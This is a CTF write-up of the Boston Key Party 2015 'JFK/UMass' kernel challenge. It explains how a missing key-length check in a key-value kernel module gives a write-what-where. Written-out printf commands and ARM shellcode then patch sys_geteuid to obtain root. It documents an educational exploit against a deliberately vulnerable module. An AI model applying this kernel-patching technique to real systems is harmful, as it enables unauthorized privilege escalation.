---
title: "Boston Key Party 2015 - JFK/UMass (pwning 300) Writeup"
slug: "bpk2015-jfk-umass-pwning-300-writeup"
date: "2015-03-02 10:38:47.863695"
author_name: "FalconK"
author_email: "falcon@iridiumlinux.org"
draft: false
toc: false
images:
---

by FalconK and hbw

The kernel on the VM contains a vulnerable driver implementing a
key-value store in the kernel.  The vulnerability gives a kernel
write-what-where.

The first thing we did is extract the package given in the challenge
using 7-zip.  The image contains a kernel and rootfs.img.

In rootfs.img, there are two files of interest: /root/flag, and
/usr/supershm.ko.  The former tells us where to go to get the flag, and
the latter is the vulnerable module.

Also of interest is the kernel, vmlinux.

The vulnerable module gets loaded at boot time.

The module has a hidden delete command, but that is not necessary.  The
commands are:

- c - create key

- s - read from key (read from key in one op)

- u - store to key (write to key in one op)

- d - delete key

The syntax is to send text in one write operation to /dev/supershm.
Only store to key takes an argument (more to follow).  Send like this:

{language=bash}
~~~~~~~~
printf "cKEY" > /dev/supershm
~~~~~~~~

where KEY is whatever the key name is.

If you send the u command, the next thing written to the device is the
value to store.
If you send c, it allocates a buffer for the key (you have to do this
before doing u, s, or d)
If you send s, it reads from the key; read from the character device to
get the value out.
Sending d deletes the key.  It is not necessary for the challenge.

The key-value structure has two parts.  The keys are stored in one data
structure, and when the module is loaded, it sets up the value areas.

The keys are stored in an array of structs that look like this:

{language=c}
~~~~~~~~
{
    DWORD value_pointer,
    DWORD busy,
    BYTE key[32]
}
~~~~~~~~

value_pointer gives the buffer allocated at start for the key.  busy is
a boolean indicating whether the chunk is allocated.

The vulnerability is that it doesn't check the key length.  So, we wrote
a key like this:

{language=bash}
~~~~~~~~
./storage.sh c $(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x60\xe3\x02\xc0\xff\xff\xff\xffKEY\x00")
~~~~~~~~

We got the memory offset 0xc002e360 from disassembling the kernel.  It's
in the sys_geteuid function, where ordinarily we would read the EUID
into r0.  We write 0xFFFFFFFF to busy (anything other than 0 is ok), to
make it think the key is allocated, and then we set the key to "KEY".
The null terminator rounds things out for the string compare.

Then, we write to that key, patching the kernel!  The patch is this:

{language=bash}
~~~~~~~~
printf "uKEY" >/dev/supershm
printf "\x00\x00\xa0\xe3\x14\x00\x83\xe5\x14\x00\x93\xe5\x1e\xff\x2f\xe1" > /dev/supershm
~~~~~~~~

In assembly, that's just this:

"System Message: WARNING/2 (<string>:, line 82)"
Cannot analyze code. No Pygments lexer found for "assembly".

{language=python}
~~~~~~~~
.. code-block:: assembly

  mov    r0, #0
  str    r0, [r3, #20]
  ldr    r0, [r3, #20]
  bx     lr

~~~~~~~~

In other words, we patched the kernel's implementation of get_euid to
zero out the process's EUID and return 0.

When you get back to the shell and run id, you should see euid=0.

Then, we wrote other shellcode to do the same thing with offset 4, the
process uid:

{language=bash}
~~~~~~~~
printf "uKEY" >/dev/supershm
printf "\x00\x00\xa0\xe3\x04\x00\x83\xe5\x04\x00\x93\xe5\x1e\xff\x2f\xe1" > /dev/supershm
~~~~~~~~

Running id now shows uid=0 and euid=0.  We're root, and we can just cat
/root/flag.
